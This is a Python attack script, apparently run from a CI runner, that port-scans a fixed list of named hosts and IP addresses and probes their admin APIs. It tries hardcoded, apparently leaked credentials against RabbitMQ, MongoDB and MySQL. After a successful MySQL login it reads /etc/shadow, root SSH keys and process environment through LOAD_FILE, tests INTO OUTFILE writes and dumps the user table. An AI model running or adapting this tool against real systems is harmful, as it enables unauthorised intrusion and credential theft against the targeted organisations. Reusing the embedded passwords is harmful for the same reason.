#!/usr/bin/env python3
# probe from GitHub-hosted runner (external egress)
import socket, ssl, json, time, sys, base64, urllib.request, urllib.error, traceback

R = {"meta": {"started": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}, "tcp": [], "http": [], "mysql": [], "mongo": [], "dns": {}}

def rec(kind, **kw):
    kw["ts"] = time.strftime("%H:%M:%S", time.gmtime())
    R[kind].append(kw)
    print("[%s] %s" % (kind, json.dumps(kw)[:600]), flush=True)

def tcp(host, port, wait=4.0):
    t0 = time.time()
    try:
        ip = socket.gethostbyname(host)
    except Exception as e:
        rec("tcp", host=host, port=port, err="resolve:%s" % e)
        return None
    try:
        s = socket.create_connection((ip, port), timeout=wait)
        s.settimeout(wait)
        dt = round((time.time() - t0) * 1000)
        banner = b""
        try:
            banner = s.recv(220)
        except Exception:
            pass
        rec("tcp", host=host, ip=ip, port=port, open=True, ms=dt, banner=banner.decode("utf-8", "replace").replace("\r", "\\r").replace("\n", "\\n")[:220])
        s.close()
        return ip
    except Exception as e:
        rec("tcp", host=host, ip=ip, port=port, open=False, err=str(e), ms=round((time.time() - t0) * 1000))
        return None

def http(url, method="GET", body=None, headers=None, timeout=8, auth=None, insecure=False):
    h = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
    if headers: h.update(headers)
    if auth:
        h["Authorization"] = "Basic " + base64.b64encode(("%s:%s" % auth).encode()).decode()
    data = body.encode() if isinstance(body, str) else body
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    try:
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        b = r.read(4000)
        st = r.status
        hd = dict(r.headers)
    except urllib.error.HTTPError as e:
        st = e.code
        try: b = e.read(4000)
        except Exception: b = b""
        hd = dict(e.headers or {})
    except Exception as e:
        rec("http", url=url, err=str(e))
        return None
    out = {"url": url, "method": method, "status": st, "len": len(b), "body": b.decode("utf-8", "replace")[:1200]}
    for k in ("Server", "WWW-Authenticate", "Set-Cookie", "Location", "Content-Type"):
        if k in hd: out[k] = hd[k][:200]
    rec("http", **out)
    return {"status": st, "body": b, "headers": hd}

PORTMAP = {
 "180.151.72.164": [22,80,443,2323,2929,5000,5432,5433,5439,8080,8082,8085,8088,9000,9001,9090,15672,27017,8761,19999],
 "180.151.72.167": [22,80,443,2323,2929,5000,5432,5433,5439,8080,8082,8085,8088,9000,9001,9090,15672,5672,27017,8761,19999,6380,8282],
 "180.151.72.171": [22,80,443,2323,2929,5000,5432,5433,5439,8080,8082,8085,8088,9000,9001,9090,15672,27017,8761,19999],
 "125.63.73.59":   [22,80,443,3000,5000,5050,5432,8080,8081,8082,9000,9090,15672,27017],
 "gitlab.oodleslab.com": [22,80,443,3000,5000,5050,5432,8080,8081,9000],
 "162.19.223.4":   [22,80,443,3306,8080,8443],
 "135.125.168.26": [22,80,443,3000,3001,8080,8443],
 "141.95.77.132":  [22,80,443,3306,20184],
 "141.95.104.76":  [22,80,443,3306,20184],
 "51.195.99.241":  [22,20184,3306,80,443],
}

for host, ports in PORTMAP.items():
    try:
        R["dns"][host] = socket.gethostbyname(host)
    except Exception as e:
        R["dns"][host] = "ERR:%s" % e
        continue
    for p in ports:
        tcp(host, p)

# --- app layer ---
http("http://180.151.72.167:8761/eureka/apps", headers={"Accept": "application/json"})
http("http://180.151.72.167:5000/v2/_catalog")
http("http://180.151.72.167:5000/v2/")
http("http://180.151.72.167:19999/api/v1/info")
http("http://180.151.72.167:15672/api/overview", auth=("dpp-admin", "dpp@admin"))
http("http://180.151.72.167:15672/api/overview", auth=("guest", "guest"))
http("http://180.151.72.167:8080/")
http("http://180.151.72.167:8080/api/token", method="POST", body=json.dumps({"username":"admin","password":"oodlesstage@123"}), headers={"Content-Type":"application/json"})
http("http://180.151.72.167:8080/api/hosts")
http("http://180.151.72.167:8080/api/containers")
http("http://180.151.72.164:8080/")
http("http://180.151.72.171:8080/")
http("http://180.151.72.164:5000/v2/_catalog")
http("http://180.151.72.171:5000/v2/_catalog")
http("http://180.151.72.164:8761/eureka/apps", headers={"Accept": "application/json"})
http("http://180.151.72.171:8761/eureka/apps", headers={"Accept": "application/json"})
for u in ("http://180.151.72.167:8282/", "http://180.151.72.167:8080/api/json", "http://125.63.73.59/", "http://125.63.73.59:8080/", "https://gitlab.oodleslab.com/", "http://gitlab.oodleslab.com/", "http://162.19.223.4/", "http://162.19.223.4:8080/", "https://135.125.168.26/", "http://135.125.168.26:3000/"):
    http(u, insecure=True, timeout=6)

# --- mongo ---
def mongo_hello(host, port=27017, user=None, pw=None, source="admin"):
    try:
        import pymongo
    except Exception as e:
        rec("mongo", host=host, port=port, err="no-pymongo:%s" % e)
        return
    try:
        kw = {}
        if user:
            kw = {"username": user, "password": pw, "authSource": source}
        c = pymongo.MongoClient(host, port, serverSelectionTimeoutMS=6000, connectTimeoutMS=6000, **kw)
        info = c.server_info()
        dbs = c.list_database_names()
        rec("mongo", host=host, port=port, user=user, ok=True, version=info.get("version"), dbs=dbs[:30])
        c.close()
    except Exception as e:
        rec("mongo", host=host, port=port, user=user, ok=False, err=str(e)[:300])

for mh in ("180.151.72.164", "180.151.72.167", "180.151.72.171"):
    mongo_hello(mh, 27017)
    mongo_hello(mh, 27017, "ai-admin", "ai-admin@123")
    mongo_hello(mh, 27017, "ai-admin", "ai-admin@123", "oodlesai")

# --- mysql ---
MYSQL_TARGETS = [
 ("141.95.77.132", 20184), ("141.95.77.132", 3306), ("141.95.104.76", 20184),
 ("51.195.99.241", 20184), ("180.151.72.167", 3306), ("125.63.73.59", 3306),
 ("162.19.223.4", 3306),
]
MYSQL_CREDS = [
 ("root", "QPyy8239s"), ("root", "mwgT5k27sIt6hYHASci0"),
 ("dms-dev", "D99S6D4BS"), ("credebt-dev", "K89ssheM"),
 ("root", "cred123"), ("cred123", "cred123"),
 ("root", "6YJ5U7W"), ("root", "6YJKEN0W"),
 ("root", "5bQBC91bM7g3"), ("root", "6YJ5U7W"),
 ("avnadmin", "AVNS_"), ("svc_bkp_1911", "x"),
]

def mysql_try(host, port, user, pw):
    try:
        import pymysql
    except Exception as e:
        rec("mysql", host=host, port=port, err="no-pymysql:%s" % e)
        return None
    t0 = time.time()
    try:
        c = pymysql.connect(host=host, port=port, user=user, password=pw, connect_timeout=8, read_timeout=10, write_timeout=10, ssl={"ssl": {}} if False else None)
    except Exception as e:
        rec("mysql", host=host, port=port, user=user, ok=False, err=str(e)[:250], ms=round((time.time()-t0)*1000))
        return None
    out = {"host": host, "port": port, "user": user, "ok": True}
    try:
        cur = c.cursor()
        for q in ("SELECT VERSION()", "SELECT @@hostname", "SELECT CURRENT_USER()", "SELECT @@secure_file_priv", "SHOW GRANTS", "SHOW DATABASES"):
            try:
                cur.execute(q)
                rows = cur.fetchall()
                out[q] = [list(map(lambda x: str(x)[:160], r)) for r in rows[:60]]
            except Exception as e:
                out[q] = "ERR:%s" % str(e)[:150]
        try:
            cur.execute("SELECT user,host,plugin FROM mysql.user")
            out["mysql.user"] = [list(r) for r in cur.fetchall()[:80]]
        except Exception as e:
            out["mysql.user"] = "ERR:%s" % str(e)[:120]
        # FILE tests
        for f in ("/etc/passwd", "/etc/shadow", "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys", "/proc/1/environ"):
            try:
                cur.execute("SELECT LOAD_FILE(%s)", (f,))
                v = cur.fetchone()[0]
                out["loadfile " + f] = ("OK len=%s" % len(v)) if v else "NULL(no FILE/perm)"
                if v:
                    out["content " + f] = (v.decode("utf-8", "replace") if isinstance(v, bytes) else str(v))[:2500]
            except Exception as e:
                out["loadfile " + f] = "ERR:%s" % str(e)[:120]
        try:
            cur.execute("SELECT 'i165296' INTO OUTFILE '/tmp/i165296_probe.txt'")
            out["outfile /tmp"] = "OK"
        except Exception as e:
            out["outfile /tmp"] = "ERR:%s" % str(e)[:150]
        try:
            cur.execute("SELECT @@datadir, @@plugin_dir, @@version_compile_os")
            out["paths"] = [list(map(str, r)) for r in cur.fetchall()]
        except Exception as e:
            out["paths"] = "ERR"
        c.close()
    except Exception as e:
        out["err"] = str(e)[:200]
    rec("mysql", **out)
    return out

for (h, p) in MYSQL_TARGETS:
    # cheap TCP first
    try:
        s = socket.create_connection((h, p), timeout=6); s.settimeout(4)
        greet = s.recv(120); s.close()
        if not greet:
            rec("mysql", host=h, port=p, note="tcp-open-no-greeting")
            continue
        rec("mysql", host=h, port=p, note="greeting", banner=greet[:100].decode("utf-8", "replace"))
    except Exception as e:
        rec("mysql", host=h, port=p, note="tcp-fail:%s" % str(e)[:120])
        continue
    for (u, pw) in MYSQL_CREDS:
        r = mysql_try(h, p, u, pw)
        if r and r.get("ok"):
            break

print("===RESULT_JSON===")
open("/tmp/i165296_result.json", "w").write(json.dumps(R, indent=1))
print(json.dumps(R))
